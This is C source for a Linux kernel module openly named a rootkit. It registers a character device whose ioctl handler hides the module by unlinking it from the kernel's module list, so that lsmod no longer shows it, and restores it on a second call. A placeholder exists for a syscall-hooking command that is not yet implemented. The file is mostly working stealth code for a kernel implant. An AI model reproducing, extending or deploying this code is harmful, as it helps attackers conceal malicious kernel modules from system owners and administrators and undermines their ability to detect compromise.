#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/cdev.h>

#include "rootkit.h"

#define OURMODNAME	"rootkit"

MODULE_AUTHOR("JACKERYLI");
MODULE_DESCRIPTION("JACKERYLI");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int major;
struct cdev *kernel_cdev;

/* Hide rootkit from lsmod */
static bool hidden;
static struct list_head *prev_module;

static void hide_rootkit(void)
{
    pr_info("rootkit: hiding rootkit!\n");
    if (THIS_MODULE->list.prev != NULL){
        prev_module = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
    }
    hidden = true;
}

static void unhide_rootkit(void)
{
    pr_info("rootkit: revealing rootkit!\n");
    if (prev_module != NULL) {
        list_add(&THIS_MODULE->list, prev_module);
    }
    hidden = false;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
	unsigned long arg)
{
	long ret = 0;

	pr_info("%s\n", __func__);

	switch (ioctl) {
	case IOCTL_MOD_HOOK:
		break;
	case IOCTL_MOD_HIDE:
        if(hidden)
            unhide_rootkit();
        else
            hide_rootkit();
		break;
	default:
		ret = -EINVAL;
	}

	return ret;
}

static int rootkit_open(struct inode *inode, struct file *filp)
{
	pr_info("%s\n", __func__);
	return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp)
{
	pr_info("%s\n", __func__);
	return 0;
}

const struct file_operations fops = {
    open:rootkit_open,
    unlocked_ioctl:rootkit_ioctl,
    release:rootkit_release,
    owner:THIS_MODULE
};

static int __init rootkit_init(void)
{
	int ret;
	dev_t dev_no, dev;

    /* Initialize variables */
    hidden = false;

	kernel_cdev = cdev_alloc();
	kernel_cdev->ops = &fops;
	kernel_cdev->owner = THIS_MODULE;

	ret = alloc_chrdev_region(&dev_no, 0, 1, "rootkit");
	if (ret < 0) {
		pr_info("major number allocation failed\n");
		return ret;
	}

	major = MAJOR(dev_no);
	dev = MKDEV(major, 0);
	pr_info("The major number for your device is %d\n", major);
	ret = cdev_add(kernel_cdev, dev, 1);
	if (ret < 0) {
		pr_info("unable to allocate cdev");
		return ret;
	}

	return 0;
}

static void __exit rootkit_exit(void)
{
	pr_info("%s: removed\n", OURMODNAME);
    cdev_del(kernel_cdev);
    unregister_chrdev_region(major, 1);
}

module_init(rootkit_init);
module_exit(rootkit_exit);